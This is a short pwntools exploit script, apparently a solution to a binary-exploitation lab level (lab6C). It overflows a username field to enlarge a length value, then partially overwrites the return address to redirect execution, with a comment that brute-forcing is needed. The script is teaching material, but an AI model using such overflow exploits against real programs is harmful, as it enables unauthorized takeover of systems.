from pwn import *

# Needs bruteforce since main is at 0x962 but the objective is at 0x72b

username = "A"*40 + "\xc6" # Overwrite msg_len with 198
tweet = "A"*196 + "\x2b\x37" # Overwrite lower bytes of return address.

io = process("/levels/lab06/lab6C")

io.recvuntil("username")
io.sendline(username)

io.recvuntil("Tweet")
io.sendline(tweet)

io.interactive()
